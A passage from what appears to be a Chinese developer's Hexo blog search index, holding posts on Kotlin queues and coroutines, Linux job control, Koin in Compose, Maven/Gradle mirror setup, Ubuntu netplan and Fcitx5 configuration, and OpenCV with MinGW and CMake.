https://gvc.1710717.xyz/proxy/
设置反向代理，用于github下载加速


set-proxy
http or socks5( scheme:&#x2F;&#x2F;host:port )
设置本地代理，可用于任何网站的下载加速


env
–remove&#x3D;false&#x2F;true
手动设置环境变量，比编辑shell配置文件或者打开windows环境变量管理更方便


install-self
-
安装vm到$HOME&#x2F;.vm，用户一般无需关心


version
-
显示vm的版本信息


completion
-
生成关于不同shell的自动补全(支持bash、zsh、fish、powershell)



Windows用户须知注意: 如果你正在使用Win11，那么你需要开启开发者模式，因为vm在创建链接符号时需要相关权限。如果你正在使用Win10，遇到创建链接符号失败的错误时，建议使用管理员权限打开powershell后再重试。在Win下，通过vm安装应用成功之后，如果在当前powershell窗口中找不到该命令，可以关闭当前powershell窗口，再打开一个新的，此时环境变量就生效了，就可以找到相关命令了，这是Win的特性，暂时修正不了。此外，还需注意的是，extFAT和FAT32格式的磁盘不支持创建链接符号，因此，在Windows下务必请使用NTFS格式的磁盘。另外需要注意的是，如果在Windows下，如果开启了Hyper-V，那么vm会与系统自带的vm命令冲突，影响到系统自带的vm命令，这种情况下，vm安装时会进行判断，如果Hyper-V已开启，则vm.exe会被重命名为vmr.exe，用户直接使用vmr命令即可。
]]></content>
      <tags>
        <tag>多平台管理工具</tag>
      </tags>
  </entry>
  <entry>
    <title>关于kotlin中的list数组</title>
    <url>/posts/b7e69161/</url>
    <content><![CDATA[最近在刷leetcode的时候，突然发现有一些算法需要使用到队列和栈。我本想着这东西并不是很难，但是认真考究一下，发现在kotlin中，并没有对于栈和队列的直接实现，而只有基础的数组和集合。尽管他有很多的语法糖，包括removeFirst(),removeLast()，之类，使其可以轻松的实现队列和栈才能完成的功能。但是对于removeFirst方法他是如何实现的呢？
removeFirst在这里先提出两种推测，

他使用的是基于数组的形式实现。那么他完成removeFirst只能通过创建一个新的数组然后对原数组进行完整的遍历。这样子时间复杂度为O(n)，效率将会很低。
他使用基于链表的形式，使每一个数组中的对象通过next连接，这样子，他完成removeFirst的话,他的时间复杂度只是O(1)。我并不能确定kotlin底层是否自动的帮我们基于不同的功能实现了不同类型的集合对象。像是java中的ArrayList，LinkedList。那么他的效率应该可以实现最优。于是我做了个测试刚开始设置数组容量为100000时，他们相差不大可是当我把数组容量提高100倍。他的效率显著的下降了。因此可以验证出，他是基于第一种方法，他完成removeFirst时，会对整个数组进行一次遍历。他的效率会非常低。而在kotlin中并没有LinkedList这样子的一个集合方法。所以在某种程度上要实现一个队列的话，他的效率会非常受影响。因此这里有一种采取循环队列的方式来实现高效的removeFirst方法。
这后面的内容引用自这里

class LoopQueue&lt;E : Any&gt;(private val capacity: Int = 10) : Queue&lt;E?&gt; &#123;    var data = arrayOfNulls&lt;Any&gt;(capacity + 1) as Array&lt;E?&gt;    //队首下标    private var front = 0    //队尾下标    private var tail = 0    //当前数据长度    private var size = 0    //实际容量位置    private var arraySize = data.size    override fun enqueue(e: E?) &#123;        //大于数组长度，扩容        if ((tail + 1) % arraySize == front) &#123;            resize(capacity * 2)        &#125;        arraySize = data.size        //入队        data[tail] = e        //确定队尾位置        tail = (tail + 1) % arraySize        //增加数据长度        ++size    &#125;    private fun resize(newCapacity: Int) &#123;        //扩容大小为传入容量+1，因为我们一定会浪费一个空间        val newData = arrayOfNulls&lt;Any&gt;(newCapacity + 1) as Array&lt;E?&gt;        //先确定当前容量大小        arraySize = data.size        //遍历旧数据源，存入新数组                // it+front原因很简单，从 原队首 位置开始遍历相加        (0..size).forEach &#123;            newData[it] = data[(it + front) % arraySize]        &#125;        data = newData        //新队首位置为0        front = 0        //新队尾位置为原数组的长度        tail = size    &#125;    override fun dequeue(): E? &#123;      	//容错判断        if (isEmpty()) throw IllegalArgumentException(&quot;队列为null&quot;)      	//拿到队首位置        val ret = data[front]        data[front] = null      	//移动队首位置        front = (front + 1) % arraySize        --size        //缩容         if (size == capacity / 4 &amp;&amp; capacity / 2 != 0) resize(capacity / 2)        return ret    &#125;    override fun getFront(): E? &#123;        if (isEmpty()) throw IllegalArgumentException(&quot;队列为null&quot;)        return data[front]    &#125;    override fun getSize(): Int &#123;        return size    &#125;    override fun isEmpty(): Boolean &#123;        return front == tail    &#125;    override fun toString(): String &#123;        val res = StringBuilder().append(&quot;Queue：&quot;).append(&quot;front [&quot;)        if (!isEmpty()) &#123;            //数据打印除重            data.filterNotNull().forEach &#123;                res.append(it).append(&quot;,&quot;)            &#125;            res.deleteCharAt(res.length - 1);        &#125;        res.append(&quot;] tail&quot;)        return res.toString()    &#125;&#125;

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>协程取消与异常处理</title>
    <url>/posts/5fa215f1/</url>
    <content><![CDATA[协程（2）当我们需要取消协程时，我们可以通过对launch的返回值Job对象执行cancel()方法来取消协程。但是当协程中正在执行计算相关的事件时，协程将不会被取消，而是会执行下去。因此即便取消了协程，任然要添加一个join()方法，避免协程没有正确取消和结束，而直接执行后面的操作。有一个简单的方法即cancelAndjoin()可以直接结合两个方法，取消并阻塞。例如:
import kotlinx.coroutines.*fun main() = runBlocking &#123;    //sampleStart    val startTime = System.currentTimeMillis()    val job = launch(Dispatchers.Default) &#123;        var nextPrintTime = startTime        var i = 0        while (i &lt; 5) &#123; // computation loop, just wastes CPU            // print a message twice a second            if (System.currentTimeMillis() &gt;= nextPrintTime) &#123;                println(&quot;job: I&#x27;m sleeping $&#123;i++&#125; ...&quot;)                nextPrintTime += 500L            &#125;        &#125;    &#125;    delay(1300L) // delay a bit    println(&quot;main: I&#x27;m tired of waiting!&quot;)    job.cancelAndJoin() // cancels the job and waits for its completion    println(&quot;main: Now I can quit.&quot;)    //sampleEnd    &#125;
在上述例程中，协程便没有正确取消。但是你依然可以join等他结束后再执行最后一句话。
使计算代码也能取消再协程中有个属性isActive当协程任然在继续时，他变为true，当他被外界取消时，他便变为false，因此你可以通过他来关掉计算的过程，如下：
import kotlinx.coroutines.*fun main() = runBlocking &#123;    //sampleStart    val startTime = System.currentTimeMillis()    val job = launch(Dispatchers.Default) &#123;        var nextPrintTime = startTime        var i = 0        while (isActive) &#123; // cancellable computation loop            // print a message twice a second            if (System.currentTimeMillis() &gt;= nextPrintTime) &#123;                println(&quot;job: I&#x27;m sleeping $&#123;i++&#125; ...&quot;)                nextPrintTime += 500L            &#125;        &#125;    &#125;    delay(1300L) // delay a bit    println(&quot;main: I&#x27;m tired of waiting!&quot;)    job.cancelAndJoin() // cancels the job and waits for its completion    println(&quot;main: Now I can quit.&quot;)    //sampleEnd    &#125;
finally在协程中，你同样可以使用try{}finally{}来实现取消协程时的回收操作。finally中的函数一定会实现。你甚至可以在finally中再调用一次协程，那并没有问题。通过withContext()方法
import kotlinx.coroutines.*fun main() = runBlocking &#123;    //sampleStart    val job = launch &#123;        try &#123;            repeat(1000) &#123; i -&gt;                println(&quot;job: I&#x27;m sleeping $i ...&quot;)                delay(500L)            &#125;        &#125; finally &#123;            withContext(NonCancellable) &#123;                println(&quot;job: I&#x27;m running finally&quot;)                delay(1000L)                println(&quot;job: And I&#x27;ve just delayed for 1 sec because I&#x27;m non-cancellable&quot;)            &#125;        &#125;    &#125;    delay(1300L) // delay a bit    println(&quot;main: I&#x27;m tired of waiting!&quot;)    job.cancelAndJoin() // cancels the job and waits for its completion    println(&quot;main: Now I can quit.&quot;)    //sampleEnd    &#125;
超时通过设置withTimeout来使超过时间的协程强行退出。这种设置会导致抛出异常
import kotlinx.coroutines.*fun main() = runBlocking &#123;    //sampleStart    withTimeout(1300L) &#123;        repeat(1000) &#123; i -&gt;            println(&quot;I&#x27;m sleeping $i ...&quot;)            delay(500L)        &#125;    &#125;    //sampleEnd&#125;]]></content>
      <tags>
        <tag>协程</tag>
        <tag>kotin</tag>
      </tags>
  </entry>
  <entry>
    <title>协程使用指南：依赖、概念和用法</title>
    <url>/posts/a0822033/</url>
    <content><![CDATA[在使用协程前，必须引入相关的依赖包
implementation(&quot;org.jetbrains.kotlinx:kotlinx-coroutines-core:1.7.1&quot;)
协程（1）本质上，协程可以称为轻量级线程。而且协程只能在协程作用域内才能启动。有CoroutineScope,GlobalScope(全局)两种作用域。而且在全局作用域内启动的协程，只受整个应用的生命周期的限制。即只要整个应用程序还在运行中，只要协程的任务还未结束，该协程就可以一直运行
delay()//delay是一个挂起函数，他并不会阻塞线程，而是将协程挂起，在特定的时候再继续执行。thread.sleep()//而thread.sleep将会阻塞线程。
举例：当协程 A 调用 delay(1000L) 函数来指定延迟1秒后再运行时，协程 A 所在的线程只是会挂起，转而去执行协程 B，等到1秒后再把协程 A 加入到可调度队列里。
//例程fun main() = runBlocking &#123;    repeat(100)&#123;        launch &#123;            println(it)        &#125;    &#125;//    Thread.sleep(2000)    delay(2000)    println(&quot;你再干嘛&quot;)&#125;    //使用Thread时，前面所有的数据都不会输出，因为线程被阻塞在主线程中，而如果使用delay。会先重复完100次，再来输出最后的话
桥接阻塞与非阻塞的世界fun main() &#123;     GlobalScope.launch &#123; // launch a new coroutine in background and continue        delay(1000L)        println(&quot;World!&quot;)    &#125;    println(&quot;Hello,&quot;) // main thread continues here immediately    runBlocking &#123;     // but this expression blocks the main thread        delay(2000L)  // ... while we delay for 2 seconds to keep JVM alive    &#125; &#125;
在上述代码中，runBocking等同于一个普通函数，但是，它可以构造一个协程作用域，在该作用域内，可以拉起线程。而且他必须执行完内部的所有程序才会结束。而他可以直接简化为main函数
fun main() = runBlocking&lt;Unit&gt; &#123; // start main coroutine    GlobalScope.launch &#123; // launch a new coroutine in background and continue        delay(1000L)        println(&quot;World!&quot;)    &#125;    println(&quot;Hello,&quot;) // main coroutine continues here immediately    delay(2000L)      // delaying for 2 seconds to keep JVM alive&#125;
结构化并发如果在同一个协程作用域内，那么只有该协程作用域内所有的协程都跑完才能结束这整个方法。（GlobalScope就不是该协程作用域）因此如果需要GlobalScope中拉起的协程不会提前终止，那么就需要将该拉起的协程加入到协程作用域内。
fun main() = runBlocking &#123;	//sampleStart    val job = GlobalScope.launch &#123; // launch a new coroutine and keep a reference to its Job        delay(1000L)        println(&quot;World!&quot;)    &#125;    println(&quot;Hello,&quot;)    job.join() // wait until child coroutine completes	//sampleEnd    &#125;
作用域构建器runBlocking 和 coroutineScope 看起来很像，因为它们都需要等待其内部所有相同作用域的子协程结束后才会结束自己。两者的主要区别在于 runBlocking 方法会阻塞当前线程，而 coroutineScope 只是挂起并释放底层线程以供其它协程使用。由于这个差别，所以 runBlocking 是一个普通函数，而 coroutineScope 是一个挂起函数,挂起函数必须得在其他的协程作用域内才能调用。launch 函数是 CoroutineScope 的扩展函数，而 runBlocking 的函数体参数也是被声明为 CoroutineScope 的扩展函数，所以 launch 函数就隐式持有了和 runBlocking 相同的协程作用域。
挂起函数是可以被提取出来的  fun main() = runBlocking &#123;    launch &#123; doWorld() &#125;    println(&quot;Hello,&quot;)&#125;// this is your first suspending functionsuspend fun doWorld() &#123;    delay(1000L)    println(&quot;World!&quot;)&#125;
只需要加上suspend修饰符即可。
全局协程类似于守护线程因为当主程序终止时，他也会跟着终止。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title>可变长参数函数vararg</title>
    <url>/posts/6b922cbb/</url>
    <content><![CDATA[函数fun函数也可以用public来修饰
可变长参数函数varargfun main() &#123;    println(&quot;hello,world&quot;)    print(sum(1,4,23,4,23,52))&#125;public fun sum( a:Int,vararg b:Int):Int&#123;    var result = a    for (bn in b)&#123;        result += bn    &#125;    return result&#125;
vararg既可以一个一个的传入参数，也可以将一个定义好的数组当作参数传入，可以用*前缀来引用该数组
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>协程异步并发及结构化</title>
    <url>/posts/88c5a738/</url>
    <content><![CDATA[协程（3）默认顺序import kotlinx.coroutines.*import kotlin.system.*fun main() = runBlocking&lt;Unit&gt; &#123;    //sampleStart    val time = measureTimeMillis &#123;        val one = doSomethingUsefulOne()        val two = doSomethingUsefulTwo()        println(&quot;The answer is $&#123;one + two&#125;&quot;)    &#125;    println(&quot;Completed in $time ms&quot;)    //sampleEnd    &#125;suspend fun doSomethingUsefulOne(): Int &#123;    delay(1000L) // pretend we are doing something useful here    return 13&#125;suspend fun doSomethingUsefulTwo(): Int &#123;    delay(1000L) // pretend we are doing something useful here, too    return 29&#125;
在上述代码中，他只拉起了一个协程。在协程内，他也是按顺序一个一个运行的。因此他最后运行任然会有两秒的延迟。

此外，即使他拉起了两个协程，他也是按照顺序或者时间片分片的方式执行（具体情况我并不清楚）。但是当他delay后，他会将现在的协程先挂起，让其他协程操作。但是同时也只能一个协程执行，也就同步操作。

async实现异步和并发当通过async来拉起协程时，他将会是一个异步的协程，此时你要通过await()来获取值。
val one = async &#123; doSomethingUsefulOne() &#125;val two = async &#123; doSomethingUsefulTwo() &#125;
惰性启动 async惰性启动即让程序员主动选择何时去拉起这个协程，通过start()和await()方法。如果不使用start方法，那么他就是一个普通的协程。在async异步协程中，有await()的话，也会等待await()的结果先返回。
结构化并发因为 async 函数被定义为 CoroutineScope 上的一个扩展函数，所以我们需要将它放在 CoroutineScope 中，这就是  coroutineScope 函数提供的功能：例如：
suspend fun failedConcurrentSum(): Int = coroutineScope &#123;    val one = async&lt;Int&gt; &#123;        try &#123;            delay(Long.MAX_VALUE) // Emulates very long computation            42        &#125; finally &#123;            println(&quot;First child was cancelled&quot;)        &#125;    &#125;    val two = async&lt;Int&gt; &#123;        println(&quot;Second child throws an exception&quot;)        throw ArithmeticException()    &#125;    one.await() + two.await()&#125;这样，如果 ```concurrentSum()``` 函数发生错误并引发异常，则在其作用域中启动的所有协程都将被取消]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title>后台进程管理命令</title>
    <url>/posts/1caafbcd/</url>
    <content><![CDATA[一、后台进程管理命令
fg、bg、jobs、&amp;、ctrl + z、ctrl + c、ctrl + \、ctrl + d1、 &amp;加在一个命令的最后，可以把这个命令放到后台执行 ,如gftp &amp;,2、ctrl + z可以将一个正在前台执行的命令放到后台，并且处于暂停状态，不可执行3、jobs查看当前有多少在后台运行的命令jobs -l选项可显示所有任务的PID，jobs的状态可以是running, stopped, Terminated,但是如果任务被终止了（kill），shell 从当前的shell环境已知的列表中删除任务的进程标识；也就是说，jobs命令显示的是当前shell环境中所起的后台正在运行或者被挂起的任务信息；4、fg将后台中的命令调至前台继续运行如果后台中有多个命令，可以用 fg %jobnumber将选中的命令调出，%jobnumber是通过jobs命令查到的后台正在执行的命令的序号(不是pid)5、bg将一个在后台暂停的命令，变成继续执行 （在后台执行）如果后台中有多个命令，可以用bg %jobnumber将选中的命令调出，%jobnumber是通过jobs命令查到的后台正在执行的命令的序号(不是pid)将任务转移到后台运行：先ctrl + z；再bg，这样进程就被移到后台运行，终端还能继续接受命令。概念：当前任务如果后台的任务号有2个，[1],[2]；如果当第一个后台任务顺利执行完毕，第二个后台任务还在执行中时，当前任务便会自动变成后台任务号码“[2]” 的后台任务。所以可以得出一点，即当前任务是会变动的。当用户输入“fg”、“bg”和“stop”等命令时，如果不加任何引号，则所变动的均是当前任务
二、进程的终止后台进程的终止：方法一：通过jobs命令查看job号（假设为num），然后执行kill %num方法二：通过ps命令查看job的进程号（PID，假设为pid），然后执行kill pid前台进程的终止：ctrl+c
三、进程的挂起（暂停的意思吧）后台进程的挂起：在solaris中通过stop命令执行，通过jobs命令查看job号(假设为num)，然后执行stop %num；在redhat中，不存在stop命令，可通过执行命令kill -stop PID，将进程挂起；当要重新执行当前被挂起的任务时，通过bg %num 即可将挂起的job的状态由stopped改为running，仍在后台执行；当需要改为在前台执行时，执行命令fg %num即可；前台进程的挂起：ctrl+Z;
四、kill的其他作用kill除了可以终止进程，还能给进程发送其它信号，使用kill -l 可以察看kill支持的信号。SIGTERM是不带参数时kill发送的信号，意思是要进程终止运行，但执行与否还得看进程是否支持。如果进程还没有终止，可以使用kill -SIGKILL pid，这是由内核来终止进程，进程不能监听这个信号。
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>在 Compose 中使用 Koin 进行依赖注入</title>
    <url>/posts/8e2f3ca0/</url>
    <content><![CDATA[导入包implementation (&quot;io.insert-koin:koin-androidx-compose:3.4.5&quot;)
在app中安装koinclass RainDropApp:Application()&#123;    override fun onCreate() &#123;        super.onCreate()        startKoin &#123;            androidLogger(Level.INFO)            androidContext(this@RainDropApp)            modules(Appmodule)        &#125;    &#125;&#125;
然后看你安装的module
val Appmodule = module &#123;    single &#123; MediaReaderImpl(get()) as MediaReader &#125;    single &#123; AudioPlayerImpl(get()) as AudioPlayer &#125;    viewModel &#123;        LocalMusicViewModel(get())    &#125;    viewModel &#123;        HomeViewModel(get())    &#125;&#125;

注入基本对象// 简单的一个日志输出类class Logger &#123;    fun print(msg: String) &#123;        Log.d(TAG, &quot;Logger print: $msg&quot;)    &#125;&#125;val module = module &#123;  	// 设置它的注入类型为单例    single &#123; Logger() &#125;&#125;@Composablefun Greeting(name: String, modifier: Modifier = Modifier) &#123;  	// 通过 koin 的 koinInject()方法进行对象注入    val logger: Logger = koinInject()    Text(        text = &quot;Hello $name!&quot;,        modifier = modifier.clickable &#123; logger.print(&quot;greeting&quot;) &#125;    )&#125;# 日志输出Logger print: greeting
从上面的代码中可以看到，module{}在普通工程和 compose 工程中用法是一致的，只是在获取依赖对象时，compose 中需要使用 koinInject() 方法来获取，此方法也是被@Composable修饰，并且通过remember()来完成内部逻辑实现。
更详细的内容请查看原文，因为他确实不难理解。

引用自掘金

]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>国内镜像源配置：Maven，Gradle，Kotlin</title>
    <url>/posts/1864f5d9/</url>
    <content><![CDATA[配置国内镜像源maven全局配置：在Maven的安装目录下的conf/settings.xml添加mirror源
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;          xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;          xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;    &lt;!-- 添加以下这段 Mirror 配置 --&gt;    &lt;mirrors&gt;        &lt;!-- Aliyun --&gt;        &lt;mirror&gt;            &lt;id&gt;aliyunmaven&lt;/id&gt;            &lt;name&gt;aliyun maven&lt;/name&gt;            &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;                  &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;        &lt;/mirror&gt;    &lt;/mirrors&gt;&lt;/settings&gt;
单项目配置修改项目中的pom.xml文件
&lt;repositories&gt;    &lt;repository&gt;        &lt;id&gt;aliyunmaven&lt;/id&gt;        &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;    &lt;/repository&gt;&lt;/repositories&gt;
Gradle全局配置在 $&#123;USER_HOME&#125;/.gradle/ 目录下创建 init.gradle 文件，添加以下内容：
allprojects &#123;    repositories &#123;        def ALIYUN_REPOSITORY_URL = &#x27;https://maven.aliyun.com/repository/public&#x27;        all &#123; ArtifactRepository repo -&gt;            if(repo instanceof MavenArtifactRepository)&#123;                def url = repo.url.toString()                if (url.startsWith(&#x27;https://repo1.maven.org/maven2&#x27;)) &#123;                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_REPOSITORY_URL.&quot;                    remove repo                &#125;            &#125;        &#125;        maven &#123; url ALIYUN_REPOSITORY_URL &#125;    &#125;&#125;
单项目配置修改项目的 build.gradle 文件，添加以下内容：
repositories &#123;    maven &#123; url &#x27;https://maven.aliyun.com/repository/public&#x27; &#125;    mavenCentral()&#125;

特别的，在kotlin的项目中，需要使用不同的方法。在build.gradle.kts里，加入以下内容
repositories &#123;    // 依赖使用阿里云 maven 源    maven &#123;        setUrl(&quot;https://maven.aliyun.com/repository/public/&quot;)    &#125;    maven &#123;        setUrl(&quot;https://maven.aliyun.com/repository/spring/&quot;)    &#125;    mavenLocal()    mavenCentral()&#125;

引用自12

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>gradle</tag>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Ubuntu 中切换 Xorg 和 Wayland</title>
    <url>/posts/98ff967b/</url>
    <content><![CDATA[只要在登陆时，在右下角有个设置选项，通过这个选项就可以切换了
如果已经进入桌面需要先注销在重新登入
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Ubuntu 服务器 22.04 上设置静态 IP 地址</title>
    <url>/posts/2f993e/</url>
    <content><![CDATA[登录到你的 Ubuntu 服务器 22.04，查找 netplan 配置文件。它位于 /etc/netplan 目录下。
 cd /etc/netplan/$ ls -ltotal 4-rw-r--r-- 1 root root 116 Oct 12 04:03 00-installer-config.yaml$

运行以下 cat 命令以查看 00-installer-config.yaml 的内容。
根据上面的输出，它说我们有 ens33 接口，它正在从 DHCP 服务器获取 IP。查看接口名称的另一种方法是通过 ip 命令。现在，要配置静态 IP 代替 DHCP，使用 vi 或 nano 编辑器编辑 netplan 配置文件并添加以下内容。
$ sudo vi 00-installer-config.yaml# This is the network config written by &#x27;subiquity&#x27;network:  renderer: networkd  ethernets:    ens33:      addresses:        - 192.168.1.247/24      nameservers:        addresses: [4.2.2.2, 8.8.8.8]      routes:        - to: default          via: 192.168.1.1  version: 2

保存并关闭文件。要是上述修改生效，请使用以下 netplan 命令应用这些更改：
sudo netplan apply

完美，以上命令的输出确认静态 IP 和路由配置成功。
]]></content>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>在windows下为mingw配置opencv</title>
    <url>/posts/29c2a35d/</url>
    <content><![CDATA[快速上手安装dev c++或者小熊猫c++
这里推荐使用小熊猫c++,他就是dev c++的pro max版本，在保持样式基本相同的同时，有很多代码高亮，提示等功能。下载链接

这是官网链接:http://royqh.net/redpandacpp/安装过程一路默认，只需要修改你所安装的位置即可。
下载已经编译好的opencvgithub realese链接注意，下载时需要和你电脑本地的mingw版本号为位数相对应才可以正常使用。
下载后，将其解压在某个具体的路径，如下：
配置编译器点击工具-&gt;选项-&gt;编译器
接下来，分别添加bin文件，lib文件目录和include目录
注意，选择的目录为你所解压的opencv文件所在的目录。
最后，在链接时添加如下选项，即完成opencv的配置。
-lopencv_core455 -lopencv_imgproc455 -lopencv_highgui455 -lopencv_imgcodecs455 -lopencv_videoio455 -lopencv_calib3d455 -lopencv_features2d455 -lopencv_objdetect455 -lopencv_flann455 -lopencv_ml455 -lopencv_photo455 -lopencv_stitching455 -lopencv_video455 -lopencv_dnn455 -lopencv_gapi455


到这为止。你就可以快乐的使用OpenCV去完成开发内容了（下面的内容可以忽略）
VSCode+CMake下的配置前置内容可以看到，在上面的配置中，我们只能使用dev c++和小熊猫c++，而且链接时需要写一大串内容。如果在更换工作环境时or帮助别人配置环境时，总是要有这么一大串要静态链接的内容。就感到颇为麻烦。
所以思考能不能优化链接的方式，通过通配符直接完成所有静态库的引用和链接。于是选择了使用CMake+VSCode的方式来完成配置(你用CLion也是可以的)
关于静态库和动态库的区分：

    


然后，不难发现；在opencv的bin目录下都是已经经过编译的动态库文件(以.dll结尾)
而在lib文件中，则是与这些动态库文件相对应的静态库文件(以.dll.a结尾)：
关于为什么会是这样子的一个形式，可以查看MingW编译时为动态库时的选项，这里仅提供一个参考的链接MingW下动态链接库常识

大抵就是说这些静态库文件并不具备具体的函数实现。他的作用只是对动态库的一个声明，方便程序在运行时自动寻找到动态库。(个人看法，不一定正确)(这样子的情况在MSVC编译器下也存在，只是表达方式不一样而已)

所以我们可以明确我们要配置opencv就是要：在编译的时候，添加上include头文件和静态库文件。在运行时让他可以找到动态库文件
编译部分文件目录如下：此时我们使用CMake（默认你们已经下载好VSCode和CMake插件等）CMakeLists.txt的内容如下:
cmake_minimum_required(VERSION 3.10)project(CV)add_executable(Test main.cpp)# 将OpenCV的静态库以别名的形式存储file(GLOB OPENCV_LIBS &quot;D:/Program Files/OpenCV/OpenCV-MinGW-Build-OpenCV-4.5.5-x64/x64/mingw/lib/libopencv_*.dll.a&quot;)include_directories(&quot;D:/Program Files/OpenCV/OpenCV-MinGW-Build-OpenCV-4.5.5-x64/include&quot;)target_link_libraries(Test $&#123;OPENCV_LIBS&#125;)

cmake_minimum_required 此命令指定了构建项目所需的最低CMake版本
project 该命令定义了项目的名称，这里项目命名为CV
add_executable(Test main.cpp) 此命令将创建一个名为Test的可执行文件，并将main.cpp作为源文件进行编译。
file(GLOB YOU_FILE_LIST_NAME DIRECTION) file()命令用于创建一个包含所有符合指定路径模式的文件的列表。可以使用通配符
include_directories() 此命令指定了包含目录，即Include的目录
target_link_libraries(Test $&#123;OPENCV_LIBS&#125;) 此命令将前面获取到的OpenCV静态库链接到目标Test。OPENCV_LIBS变量包含了所有需要链接的库文件，CMake会将它们与Test目标进行链接

当你ctrl+s保存后，CMake会自动帮你配置。你只需要点击屏幕下的build按钮
然后你就可以看到build目录下有一个Text.exe文件，即完成了编译工作了。
运行此时，我们点击该文件运行，却发现仍然有错误：显示缺少动态运行库

对，这很合理，因为你只为它链接了动态库的imp-lib，他会去寻找动态库在哪。但是因为你没有为他配置动态库，所以他找不到。于是再次报错。
这里提供几个解决方法：

把bin目录下所有的dll文件复制到EXE文件目录，或者把EXE文件放到OpenCV的bin目录下，就可以直接运行。(这个方法有点笨，但最简单有效,而且不会污染开发环境)

把OpenCV的bin目录放到PATH下。如图：  这种方法也简单，但是考虑到我并不会长期使用OpenCV，可能只是应付上课or什么的。所以我也不想污染我的环境。所以还有最后一个方法

使用VSCode的launch调试工具 
 他需要你创建一个launch.json用于启动你运行的程序 具体内容如下：
 &#123;  &quot;version&quot;: &quot;0.2.0&quot;,&quot;configurations&quot;: [    &#123;        &quot;name&quot;: &quot;Debug with MinGW GDB&quot;,        &quot;type&quot;: &quot;cppdbg&quot;,        &quot;request&quot;: &quot;launch&quot;,        &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/build/Test.exe&quot;,        &quot;args&quot;: [],        &quot;stopAtEntry&quot;: false,        &quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;,        &quot;environment&quot;: [            &#123;                &quot;name&quot;: &quot;PATH&quot;,                &quot;value&quot;: &quot;D:/Program Files/OpenCV/OpenCV-MinGW-Build-OpenCV-4.5.5-x64/x64/mingw/bin;$&#123;env:PATH&#125;&quot;            &#125;        ],        &quot;externalConsole&quot;: true,        &quot;MIMode&quot;: &quot;gdb&quot;,        &quot;miDebuggerPath&quot;: &quot;C:/Program Files/RedPanda-Cpp/MinGW64/bin/gdb.exe&quot;,           &#125;    ]&#125;

 在上述代码中：

program 这个字段指定了要调试的可执行文件路径
cwd 这是程序的当前工作目录,即你的程序跑起来是的根目录，如果你有通过相对路径读取文件的话，比如我读取的lena.jpg他就应该在这个目录下，他通常就是你的cpp所在的目录。
environment 该字段定义了调试会话的环境变量，这里就是最重点的部分，你在这里添加上OpenCV的bin目录的路径，然后就他就可以在调试中启动。既不污染电脑的环境，也达到了跑程序的目的
externalConsole 这个字段设置为 true，表示调试时会启动一个外部终端窗口。方便截图提交作业( •̀ ω •́ )y
miDebuggerPath 该字段指定了 GDB 调试器的路径，就是你的MinGW的bin目录下的gdb程序

 上述是我认为稍微重点的部分，其他更多的参数配置请查询官网。


至此。再点击launch运行该程序，同时你还可以给你的程序打断点进行调试。
于是，所有的配置部分都圆满结束。
]]></content>
      <tags>
        <tag>opencv</tag>
        <tag>mingw</tag>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Ubuntu 安装配置 Fcitx 5 中文输入法</title>
    <url>/posts/3fc249cf/</url>
    <content><![CDATA[检查系统中文环境在 Ubuntu 设置中打开「区域与语言」—— 「管理已安装的语言」，然后会自动检查已安装语言是否完整。若不完整，根据提示安装即可。
最小安装为使用 Fcitx 5，需要安装三部分基本内容：

Fcitx 5 主程序
中文输入法引擎
图形界面相关

按照这个思路，可以直接使用 apt 进行安装：
sudo apt install fcitx5 \fcitx5-chinese-addons \fcitx5-frontend-gtk4 fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 \fcitx5-frontend-qt5

安装中文词库在 GitHub 打开维基百科中文拼音词库的 Releases 界面，下载最新版的 .dict 文件。按照 README 的指导，将其复制到 ~/.local/share/fcitx5/pinyin/dictionaries/ 文件夹下即可。
# 下载词库文件wget https://github.com/felixonmars/fcitx5-pinyin-zhwiki/releases/download/0.2.4/zhwiki-20220416.dict# 创建存储目录mkdir -p ~/.local/share/fcitx5/pinyin/dictionaries/# 移动词库文件至该目录mv zhwiki-20220416.dict ~/.local/share/fcitx5/pinyin/dictionaries/**SHELL**

配置设置为默认输入法使用 im-config 工具可以配置首选输入法，在任意命令行输入：
im-config

根据弹出窗口的提示，将首选输入法设置为 Fcitx 5 即可。
环境变量需要为桌面会话设置环境变量，即将以下配置项写入某一配置文件中：
export XMODIFIERS=@im=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitx

如果使用 Bash 作为 shell，则建议写入至 ~/.bash_profile，这样只对当前用户生效，而不影响其他用户。

引用自https://muzing.top/posts/3fc249cf/

]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓插件异常</title>
    <url>/posts/87b15a64/</url>
